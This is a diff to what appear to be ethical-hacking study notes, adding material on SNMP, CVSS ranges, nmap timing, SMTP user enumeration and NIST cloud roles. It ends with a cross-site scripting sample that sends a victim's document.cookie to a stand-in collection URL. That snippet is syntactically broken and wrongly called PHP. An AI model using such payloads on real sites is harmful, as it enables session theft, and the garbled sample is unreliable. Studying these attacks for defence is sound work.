@@ -52,6 +52,17 @@ LMMIB2.MIB	Covers workstation and server services
 MIB_II.MIB	Contains the Management Information Base (MIB-II), which provides a simple, workable architecture and system for managing TCP/IP-based internets
 WINS.MIB	Microsoft-defined MIB for the Windows Internet Name Service (WINS)
 
+SNMP
+Uses a community string for PW
+SNMPv3 encrypts the community strings
+
+The Common Vulnerability Scoring System (CVSS) 
+none 0.0
+Low 0.1 -.3.9
+Medium 4.0 - 6.9
+High 7.0 -8.9
+Critical 9.0-10.0
+
 Cryptography
 
 SYMMETRIC ENCRYPTION
@@ -310,7 +321,7 @@ NMAP <SCAN OPTIONS> <TARGET>
 -PI: ICMP ping – PS: SYN ping
 -PT: TCP ping -oN: Normal output
 -oX: XML output -A OS/Vers/Script
--T<0-4>: Slow – Fast
+-T<0-5>: Slow – Fast ( 0 least detective)
 
 NMAP SCAN TYPES
 
@@ -328,10 +339,6 @@ IDLE: Spoofed IP, SYN flag, designed for stealth.
 Open = SYN/ACK, Closed= RST/ACK
 NULL: No flags set. Responses vary by OS. NULL scans are designed for Linux/ Unix machines.
 
-
-SNMP
-Uses a community string for PW
-SNMPv3 encrypts the community strings
 
 NETBIOS	
 nbstat	
@@ -496,6 +503,10 @@ Bluesmacking: DoS against a device
 Bluejacking: Sending messages to/from devices
 Bluesniffing: Sniffs for Bluetooth
 Bluesnarfing: actual theft of data from a device
+
+Password protection in apps:
+
+Use Password salting
 
 
 Trojans and Other Attacks
@@ -833,4 +844,53 @@ ADMutate
 NIDSBench
 IDSInformer
 Inundator
+
+
+
+
+SMTP Telnet technique port 25
+
+SMTP provides 3 built-in-commands:
+— VRFY: means validates users.
+— EXPN: Tells the actual delivery addresses of aliases and mailing lists.
+— RCPT TO: Defines the recipients of the message.
+
+
+NIST:
+
+Cloud auditor
+
+A cloud auditor is a party that can perform an independent examination of cloud service controls with the intent to express an opinion thereon. Audits are performed to verify conformance to standards through a review of objective evidence.
+
+Cloud broker
+
+https://en.wikipedia.org/wiki/Cloud_broker
+
+Cloud Broker is an entity that manages the use, performance and delivery of cloud services, and negotiates relationships between cloud providers and cloud consumers. As cloud computing evolves, the integration of cloud services may be too complex for cloud consumers to manage alone.
+
+Cloud broker and its interactions with other parties
+
+In such cases, a cloud consumer may request cloud services from a cloud broker, instead of contacting a cloud provider directly," according to NIST Cloud Computing Reference Architecture.
+
+Cloud consumer
+
+The cloud consumer is the principal stakeholder for the cloud computing service. A cloud consumer represents a person or organization that maintains a business relationship with, and uses the service from a cloud provider. A cloud consumer browses the service catalog from a cloud provider, requests the appropriate service, sets up service contracts with the cloud provider, and uses the service.
+
+Cloud carrier
+
+A carrier cloud is a class of cloud that integrates wide area networks (WAN) and other attributes of communications service providers’ carrier-grade networks to enable the deployment of highly demanding applications in the cloud. In contrast, classic cloud computing focuses on the data center, and does not address the network connecting data centers and cloud users. This may result in unpredictable response times and security issues when business-critical data are transferred over the Internet.
+
+
+
+
+
+Script samples:
+
+This PHP file silently executes the code and grabs the user's session cookie and session ID.
+
+
+<script> 
+document.write("<img.src="https://localhost/submitcookie.php? cookie =" + escape(document.cookie) +"" />); 
+</script> 
+
 
